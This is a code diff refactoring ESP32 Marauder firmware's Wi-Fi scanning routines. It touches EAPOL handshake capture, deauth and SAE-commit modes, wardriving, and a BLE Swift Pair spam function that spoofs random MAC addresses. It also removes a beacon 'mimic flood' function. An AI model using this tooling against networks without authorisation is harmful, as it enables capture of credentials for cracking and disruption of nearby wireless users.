-      display_obj.tteBar = true;
-      display_obj.print_delay_1 = 15;
-      display_obj.print_delay_2 = 10;
-      display_obj.initScrollValues(true);
-      display_obj.tft.setTextWrap(false);
-      display_obj.tft.setTextColor(TFT_WHITE, color);
+      this->setupScanDisplayArea(TFT_WHITE, color);
       #ifdef HAS_FULL_SCREEN
         display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
-        display_obj.tft.drawCentreString(text_table4[38],TFT_WIDTH / 2,16,2);
-      #endif
-      #ifdef HAS_ILI9341
-        display_obj.touchToExit();
+        display_obj.tft.drawCentreString("EAPOL Sniff",TFT_WIDTH / 2,16,2);
       #endif
       display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-      display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+      display_obj.tftDrawChannelScaleButtons(set_channel, false);
+      display_obj.tftDrawExitScaleButtons(false);
+      display_obj.tftDrawChanHopButton(false, settings_obj.loadSetting<bool>("ChanHop"));
     #endif
-  #endif
+//  #endif
 
   esp_wifi_init(&cfg);
   #ifdef HAS_IDF_3
@@ -4405,12 +4583,22 @@ void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
 
   esp_err_t err;
   wifi_config_t conf;
-  err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);
-  if (err != 0)
-  {
-    Serial.print(F("could not set protocol : err=0x"));
-    Serial.println(err, HEX);
-  }
+  #ifndef HAS_DUAL_BAND
+    err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);
+  #else
+    wifi_protocols_t p = {
+      .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
+      .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
+    };
+
+    err = esp_wifi_set_protocols(WIFI_IF_AP, &p);
+  #endif
+
+  //if (err != 0)
+  //{
+  //  Serial.print(F("could not set protocol : err=0x"));
+  //  Serial.println(err, HEX);
+  //}
 
   esp_wifi_get_config((wifi_interface_t)WIFI_IF_AP, &conf);
   conf.ap.ssid[0] = '\0';
@@ -4431,64 +4619,20 @@ void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
   this->setMac();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
-    esp_wifi_set_promiscuous_rx_cb(&activeEapolSnifferCallback);
-  else if (scan_mode == WIFI_SCAN_ACTIVE_LIST_EAPOL)
-    esp_wifi_set_promiscuous_rx_cb(&activeEapolSnifferCallback);
-  else
-    esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
+  esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
   this->changeChannel(this->set_channel);
-  //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
-  this->wifi_initialized = true;
-  initTime = millis();
-}
-
-
-// Function to prepare for beacon mimic
-void WiFiScan::RunMimicFlood(uint8_t scan_mode, uint16_t color) {
-  #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_BLACK, color);
-    #ifdef HAS_FULL_SCREEN
-      display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
-      display_obj.tft.drawCentreString(" Mimic Flood ",TFT_WIDTH / 2,16,2);
-    #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
-    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-  #endif
-  
-  packets_sent = 0;
-  esp_wifi_init(&cfg);
-  #ifdef HAS_IDF_3
-    esp_wifi_set_country(&country);
-    esp_event_loop_create_default();
-  #endif
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_AP_STA);
-  esp_wifi_start();
-  this->setMac();
-  esp_wifi_set_promiscuous_filter(NULL);
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_max_tx_power(78);
   this->wifi_initialized = true;
   initTime = millis();
 }
 
 // Pineapple
-void WiFiScan::RunPineScan(uint8_t scan_mode, uint16_t color)
-{
+void WiFiScan::RunPineScan(uint8_t scan_mode, uint16_t color) {
   this->clearPineScanTrackers();
 
-  startPcap("pinescan");
+  startPcap(F("pinescan"));
 
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -4496,25 +4640,15 @@ void WiFiScan::RunPineScan(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
   
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_BLACK, color);
+    this->setupScanDisplayArea(TFT_BLACK, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       display_obj.tft.drawCentreString(text_table4[48],TFT_WIDTH / 2,16,2);
     #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
-    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    this->prepareScanStage(TFT_RED, TFT_BLACK);
   #endif
   
   esp_wifi_init(&cfg2);
@@ -4522,13 +4656,14 @@ void WiFiScan::RunPineScan(uint8_t scan_mode, uint16_t color)
     esp_wifi_set_country(&country);
     esp_event_loop_create_default();
   #endif
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  this->setWiFiMode(WIFI_MODE_NULL, pineScanSnifferCallback);
+  /*esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_wifi_set_mode(WIFI_MODE_NULL);
   esp_wifi_start();
   this->setMac();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&pineScanSnifferCallback);
+  esp_wifi_set_promiscuous_rx_cb(&pineScanSnifferCallback);*/
   this->changeChannel(this->set_channel);
   //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
@@ -4536,13 +4671,13 @@ void WiFiScan::RunPineScan(uint8_t scan_mode, uint16_t color)
 }
 
 // MultiSSID
-void WiFiScan::RunMultiSSIDScan(uint8_t scan_mode, uint16_t color)
-{
+void WiFiScan::RunMultiSSIDScan(uint8_t scan_mode, uint16_t color) {
   this->clearMultiSSID();
 
-  startPcap("multissid");
+  startPcap(F("multissid"));
 
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -4550,25 +4685,15 @@ void WiFiScan::RunMultiSSIDScan(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
   
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_BLACK, color);
+    this->setupScanDisplayArea(TFT_BLACK, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       display_obj.tft.drawCentreString(text_table4[49],TFT_WIDTH / 2,16,2);
     #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
-    display_obj.tft.setTextColor(TFT_BLUE, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    this->prepareScanStage(TFT_BLUE, TFT_BLACK);
   #endif
   
   esp_wifi_init(&cfg2);
@@ -4576,24 +4701,25 @@ void WiFiScan::RunMultiSSIDScan(uint8_t scan_mode, uint16_t color)
     esp_wifi_set_country(&country);
     esp_event_loop_create_default();
   #endif
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  this->setWiFiMode(WIFI_MODE_NULL, multiSSIDSnifferCallback);
+  /*esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_wifi_set_mode(WIFI_MODE_NULL);
   esp_wifi_start();
   this->setMac();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&multiSSIDSnifferCallback);
+  esp_wifi_set_promiscuous_rx_cb(&multiSSIDSnifferCallback);*/
   this->changeChannel(this->set_channel);
   //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
   initTime = millis();
 }
 
-void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color)
-{
-  startPcap("pwnagotchi");
+void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color) {
+  startPcap(F("pwnagotchi"));
 
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -4601,25 +4727,15 @@ void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
 
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_WHITE, color);
+    this->setupScanDisplayArea(TFT_WHITE, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       display_obj.tft.drawCentreString(text_table4[37],TFT_WIDTH / 2,16,2);
     #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
-    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    this->prepareScanStage(TFT_GREEN, TFT_BLACK);
   #endif
   
   esp_wifi_init(&cfg2);
@@ -4627,13 +4743,14 @@ void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color)
     esp_wifi_set_country(&country);
     esp_event_loop_create_default();
   #endif
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  this->setWiFiMode(WIFI_MODE_NULL, beaconSnifferCallback);
+  /*esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_wifi_set_mode(WIFI_MODE_NULL);
   esp_wifi_start();
   this->setMac();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
+  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);*/
   this->changeChannel(this->set_channel);
   //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
@@ -4682,13 +4799,15 @@ void WiFiScan::setBaseMacAddress(uint8_t macAddr[6]) {
     esp_err_t err = esp_base_mac_addr_set(macAddr);
 
     // Check for success or handle errors
-    if (err == ESP_OK) {
-      return;
-    } else if (err == ESP_ERR_INVALID_ARG) {
-      Serial.println(F("Error: Invalid MAC address argument."));
-    } else {
-      Serial.printf("Error: Failed to set MAC address. Code: %d\n", err);
-    }
+    //if (err == ESP_OK) {
+    //  return;
+    //} 
+    //else if (err == ESP_ERR_INVALID_ARG) {
+    //  Serial.println(F("Error: Invalid MAC address argument."));
+    //} 
+    //else {
+    //  Serial.printf("Error: Failed to set MAC address. Code: %d\n", err);
+    //}
   //#endif
 }
 
@@ -4735,8 +4854,6 @@ void WiFiScan::executeSwiftpairSpam(EBLEPayloadType type) {
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
 
-    //esp_base_mac_addr_set(macAddr);
-
     this->setBaseMacAddress(macAddr);
 
     NimBLEDevice::init("");
@@ -4745,16 +4862,13 @@ void WiFiScan::executeSwiftpairSpam(EBLEPayloadType type) {
 
     pAdvertising = pServer->getAdvertising();
 
-    //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
     NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
     delay(10);
     pAdvertising->stop();
 
-    //#ifndef HAS_DUAL_BAND
-      NimBLEDevice::deinit();
-    //#endif
+    NimBLEDevice::deinit();
   #endif
 }
 
@@ -4808,10 +4922,6 @@ void WiFiScan::executeWarDrive() {
 
           if (this->currentScanMode == BT_SCAN_FLOCK_WARDRIVE) {
             for (int x = 0; x < sizeof(flock_ssid)/sizeof(this->flock_ssid[0]); x++) {
-              //Serial.print("Comparing ");
-              //Serial.print(ssid);
-              //Serial.print(" to ");
-              //Serial.println(this->flock_ssid[x]);
               if (strcasestr(ssid.c_str(), this->flock_ssid[x])) {
                 do_continue = false;
                 break;
@@ -4862,8 +4972,8 @@ void WiFiScan::executeWarDrive() {
           this->beacon_frames++;
         }
 
-        Serial.println("APs: " + (String)this->beacon_frames);
-        Serial.println("BLE: " + (String)this->bt_frames);
+        //Serial.println("APs: " + (String)this->beacon_frames);
+        //Serial.println("BLE: " + (String)this->bt_frames);
 
         // Free up that memory, you sexy devil
         WiFi.scanDelete();
@@ -4872,12 +4982,17 @@ void WiFiScan::executeWarDrive() {
         // Start a BLE scan
         if (currentScanMode == WIFI_SCAN_WAR_DRIVE) {
           #ifdef HAS_BT
+            this->bt_pending_clear = true;
+            while (bt_cb_busy)
+              delay(100);
+            pBLEScan->clearResults();
             #ifdef HAS_NIMBLE_2
               pBLEScan->start(500, false, false); // Scan is in MS
             #else
               pBLEScan->start(1, scanCompleteCB, false); // Scan is in Seconds
             #endif
             this->ble_scanning = true;
+            this->bt_pending_clear = false;
           #endif
         }
       }
@@ -4936,14 +5051,13 @@ void WiFiScan::displayWardriveStats() {
 }
 
 // Function to start running a beacon scan
-void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
-{
+void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color) {
   if (scan_mode == WIFI_SCAN_AP)
-    startPcap("beacon");
+    startPcap(F("beacon"));
   else if (scan_mode == WIFI_SCAN_WAR_DRIVE) {
     #ifdef HAS_GPS
       if (gps_obj.getGpsModuleStatus()) {
-        startLog("wardrive");
+        startLog(F("wardrive"));
         String header_line = "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION + ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION + ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n";
         buffer_obj.append(header_line);
       } else {
@@ -4954,7 +5068,8 @@ void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
     #endif
   }
 
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -4962,16 +5077,10 @@ void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
   
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_WHITE, color);
+    this->setupScanDisplayArea(TFT_WHITE, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       if (scan_mode == WIFI_SCAN_AP)
@@ -4981,11 +5090,21 @@ void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
         display_obj.tft.drawCentreString("Wardrive", TFT_WIDTH / 2, 16, 2);
       }
       #ifdef HAS_ILI9341
-        display_obj.touchToExit();
+        if (scan_mode != WIFI_SCAN_AP)
+          display_obj.touchToExit();
       #endif
     #endif
     display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    //if (scan_mode != WIFI_SCAN_AP)
+      //display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    //else {
+      //display_obj.setupScrollArea((STATUS_BAR_WIDTH * 2) + EXT_BUTTON_WIDTH, BOT_FIXED_AREA);
+    if (scan_mode != WIFI_SCAN_WAR_DRIVE) {
+      display_obj.tftDrawChannelScaleButtons(set_channel, false);
+      display_obj.tftDrawExitScaleButtons(false);
+      display_obj.tftDrawChanHopButton(false, settings_obj.loadSetting<bool>("ChanHop"));
+    }
+    //}
   #endif
 
   if (scan_mode != WIFI_SCAN_WAR_DRIVE) {
@@ -4995,13 +5114,14 @@ void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
       esp_wifi_set_country(&country);
       esp_event_loop_create_default();
     #endif
-    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    this->setWiFiMode(WIFI_MODE_NULL, beaconSnifferCallback);
+    /*esp_wifi_set_storage(WIFI_STORAGE_RAM);
     esp_wifi_set_mode(WIFI_MODE_NULL);
     esp_wifi_start();
     this->setMac();
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_filter(&filt);
-    esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
+    esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);*/
     this->changeChannel(this->set_channel);
     //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   }
@@ -5017,37 +5137,18 @@ void WiFiScan::startWardriverWiFi() {
   WiFi.disconnect();
 }
 
-void WiFiScan::RunStationScan(uint8_t scan_mode, uint16_t color)
-{
-  startPcap("station");
+/*void WiFiScan::RunStationScan(uint8_t scan_mode, uint16_t color) {
+  startPcap(F("station"));
 
-  #ifdef HAS_FLIPPER_LED
-    flipper_led.sniffLED();
-  #elif defined(XIAO_ESP32_S3)
-    xiao_led.sniffLED();
-  #elif defined(MARAUDER_M5STICKC)
-    stickc_led.sniffLED();
-  #else
-    led_obj.setMode(MODE_SNIFF);
-  #endif
+  this->setLEDMode(MODE_SNIFF);
   
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_BLACK, color);
+    this->setupScanDisplayArea(TFT_BLACK, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       display_obj.tft.drawCentreString(text_table1[59],TFT_WIDTH / 2,16,2);
     #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
-    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    this->prepareScanStage(TFT_GREEN, TFT_BLACK);
   #endif
   
   esp_netif_init();
@@ -5055,40 +5156,34 @@ void WiFiScan::RunStationScan(uint8_t scan_mode, uint16_t color)
   //esp_wifi_init(&cfg);
   esp_err_t err = esp_wifi_init(&cfg2);
   if (err != ESP_OK) {
-    Serial.printf("Custom config failed (0x%04X), falling back to default...\n", err);
+    //Serial.printf("Custom config failed (0x%04X), falling back to default...\n", err);
     wifi_init_config_t default_cfg = WIFI_INIT_CONFIG_DEFAULT();
     err = esp_wifi_init(&default_cfg);
-    if (err != ESP_OK) {
-      Serial.printf("Default config also failed (0x%04X)\n", err);
-    } else {
-      Serial.println(F("Wi-Fi init succeeded with default config."));
-    }
-  } else {
-    Serial.println(F("Wi-Fi init succeeded with custom config."));
-  }
+    //if (err != ESP_OK) {
+    //  Serial.printf("Default config also failed (0x%04X)\n", err);
+    //} else {
+    //  Serial.println(F("Wi-Fi init succeeded with default config."));
+    //}
+  } 
+  //else {
+  //  Serial.println(F("Wi-Fi init succeeded with custom config."));
+  //}
   #ifdef HAS_IDF_3
     esp_wifi_set_country(&country);
     esp_event_loop_create_default();
   #endif
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
-  esp_wifi_start();
-  this->setMac();
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&stationSnifferCallback);
+  this->setWiFiMode(WIFI_MODE_NULL, stationSnifferCallback);
   this->changeChannel(this->set_channel);
-  //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
   initTime = millis();
-}
+}*/
 
-void WiFiScan::RunRawScan(uint8_t scan_mode, uint16_t color)
-{
+void WiFiScan::RunRawScan(uint8_t scan_mode, uint16_t color) {
   if (scan_mode != WIFI_SCAN_SIG_STREN)
-    startPcap("raw");
+    startPcap(F("raw"));
 
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -5096,16 +5191,10 @@ void WiFiScan::RunRawScan(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
   
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_WHITE, color);
+    this->setupScanDisplayArea(TFT_WHITE, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       if (scan_mode != WIFI_SCAN_SIG_STREN) {
@@ -5118,7 +5207,7 @@ void WiFiScan::RunRawScan(uint8_t scan_mode, uint16_t color)
       }
     #endif
     display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    //display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
     //display_obj.setupScrollArea((STATUS_BAR_WIDTH * 2) + CHAR_WIDTH - 1, BOT_FIXED_AREA);
 
     #ifdef HAS_ILI9341
@@ -5127,12 +5216,14 @@ void WiFiScan::RunRawScan(uint8_t scan_mode, uint16_t color)
         display_obj.tft.setFreeFont(NULL);
         display_obj.tft.setTextSize(1);
         display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-        if (scan_mode != WIFI_SCAN_SIG_STREN)
-          display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
-        else
-          display_obj.setupScrollArea((STATUS_BAR_WIDTH * 2) + CHAR_WIDTH - 1, BOT_FIXED_AREA);
+        //if (scan_mode != WIFI_SCAN_SIG_STREN)
+        //  display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+        //else
+        //  display_obj.setupScrollArea((STATUS_BAR_WIDTH * 2) + CHAR_WIDTH - 1, BOT_FIXED_AREA);
         display_obj.tftDrawChannelScaleButtons(set_channel, false);
         display_obj.tftDrawExitScaleButtons(false);
+        if (scan_mode == WIFI_SCAN_RAW_CAPTURE)
+          display_obj.tftDrawChanHopButton(false, settings_obj.loadSetting<bool>("ChanHop"));
       }
     #endif
   #endif
@@ -5142,24 +5233,25 @@ void WiFiScan::RunRawScan(uint8_t scan_mode, uint16_t color)
     esp_wifi_set_country(&country);
     esp_event_loop_create_default();
   #endif
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  this->setWiFiMode(WIFI_MODE_NULL, beaconSnifferCallback);
+  /*esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_wifi_set_mode(WIFI_MODE_NULL);
   esp_wifi_start();
   this->setMac();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
+  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);*/
   this->changeChannel(this->set_channel);
   //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
   initTime = millis();
 }
 
-void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color)
-{
-  startPcap("deauth");
+void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color) {
+  startPcap(F("deauth"));
 
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -5167,25 +5259,19 @@ void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
   
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_BLACK, color);
+    this->setupScanDisplayArea(TFT_BLACK, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       display_obj.tft.drawCentreString(text_table4[39],TFT_WIDTH / 2,16,2);
     #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
     display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+
+    display_obj.tftDrawChannelScaleButtons(set_channel, false);
+    display_obj.tftDrawExitScaleButtons(false);
+    display_obj.tftDrawChanHopButton(false, settings_obj.loadSetting<bool>("ChanHop"));
   #endif
   
   esp_wifi_init(&cfg2);
@@ -5194,13 +5280,14 @@ void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color)
     esp_event_loop_create_default();
   #endif
   esp_wifi_set_ps(WIFI_PS_NONE);
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  this->setWiFiMode(WIFI_MODE_NULL, beaconSnifferCallback);
+  /*esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_wifi_set_mode(WIFI_MODE_NULL);  
   esp_wifi_start();
   this->setMac();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
+  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);*/
   this->changeChannel(this->set_channel);
   //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
@@ -5209,11 +5296,12 @@ void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color)
 
 void WiFiScan::RunSAEScan(uint8_t scan_mode, uint16_t color) {
   if (scan_mode == WIFI_SCAN_SAE_COMMIT)
-    this->startPcap("sae_commit");
+    this->startPcap(F("sae_commit"));
   else if (scan_mode != WIFI_ATTACK_SAE_COMMIT)
     return;
 
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -5221,25 +5309,15 @@ void WiFiScan::RunSAEScan(uint8_t scan_mode, uint16_t color) {
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
   
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_BLACK, color);
